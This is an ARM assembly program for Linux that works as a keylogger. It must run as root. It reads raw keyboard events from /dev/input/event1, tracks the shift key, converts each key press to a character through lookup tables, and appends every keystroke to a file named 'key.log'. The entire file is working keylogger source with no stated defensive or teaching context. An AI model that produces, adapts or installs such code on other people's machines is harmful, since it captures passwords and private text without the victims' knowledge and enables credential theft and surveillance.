        .global _start

        .text

_start:
        // open destination file
        mov   r7, #5                     // open syscall
        ldr   r0, =dest
        ldr   r1, =02101                 // O_WRONLY | O_CREAT | O_APPEND
        mov   r2, #00644                 // S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH
        svc   #0
        mov   r11, r0                    // save returned file handler

        // open source file
        mov   r7, #5                     // open syscall
        ldr   r0, =source
        mov   r1, #0                     // O_RDONLY
        svc   #0
        mov   r12, r0                    // save returned file handler

        // check root privileges for reading source file
        ldr   r1, =0xFFFFFFF3            // error code for not being root
        cmp   r0, r1                     // test if returned value was error code
        beq   error                      // jump to error handler

loop:
        // get next input_event
        mov   r7, #3                     // read syscall
        mov   r0, r12                    // source file handler
        ldr   r1, =input_event
        mov   r2, #16                    // get single input_event (16 bytes)
        svc   #0

        // save input_event.type
        ldr   r0, =input_event
        ldrh  r0, [r0, #8]

        // skip if input_event.type != 1 (not EV_KEY, keypress or release)
        cmp   r0, #1
        bne   loop

        // save input_event.value
        ldr   r0, =input_event
        ldr   r0, [r0, #12]

        // skip if input_event.value == 0 (release)
        cmp   r0, #0
        beq   checkShiftRelease
        b     skipShiftReleaseCheck

checkShiftRelease:
        ldr   r0, =input_event
        ldrh  r0, [r0, #10]

        cmp   r0, #42                    // left shift key
        beq   releaseShift

        cmp   r0, #54                    // right shift key
        beq   releaseShift
        b     loop

releaseShift:
        // reset shift flag to 0
        ldr   r9, =shift
        mov   r8, #0
        strb  r8, [r9]
        b     loop

skipShiftReleaseCheck:
        // save input_event.code (key)
        ldr   r0, =input_event
        ldrh  r0, [r0, #10]

        // check if key is a shift
        cmp   r0, #42                    // left shift key
        beq   setShift

        cmp   r0, #54                    // right shift key
        beq   setShift
        b     checkShiftSet

setShift:
        // set shift flag to 1
        ldr   r9, =shift
        mov   r8, #1
        strb  r8, [r9]
        b     loop

checkShiftSet:
        // use shift flag to determine which case to use
        ldr   r9, =shift
        ldrb  r8, [r9]
        cmp   r8, #0
        beq   lower

upper:
        // shift flag was set to 1
        ldr   r1, =uppercase
        ldrb  r0, [r1, r0]
        b     write

lower:
        // shift flag was set to 0
        ldr   r1, =lowercase
        ldrb  r0, [r1, r0]

write:
        // save ascii code for current character
        ldr   r9, =character
        strb  r0, [r9]

        // write character to destination file
        mov   r7, #4                     // write syscall
        mov   r0, r11                    // log file descriptor
        ldr   r1, =character
        mov   r2, #1                     // number of bytes to write
        svc   #0

        // get next character
        b     loop

_end:
        // for clean exit
        mov   r7, #1                     // exit syscall
        svc   #0

error:
        // print error message to stdout
        mov   r7, #4                     // write syscall
        mov   r0, #2                     // STDERR_FILENO
        ldr   r1, =errMsg
        ldr   r2, =lenErrMsg
        svc   #0
        b     _end

        .data

dest:   .asciz "key.log"
source: .asciz "/dev/input/event1"

errMsg: .asciz "Error: Program must be ran as root.\n"
        .equ   lenErrMsg, (.-errMsg)

lowercase:
        .ascii "??1234567890-=\b\tqwertyuiop[]\n?asdfghjkl;'`?\\zxcvbnm,./?*? ?????????????"
        .ascii "789-456+1230.????????????\n?/??????????????????????????????????????????????"
uppercase:
        .ascii "??!@#$%^&*()_+??QWERTYUIOP{}\n?ASDFGHJKL:\"~?|ZXCVBNM<>???? ???????????????"

input_event:
        .fill 16, 1, 0
character:
        .byte 0
shift:  .byte 0
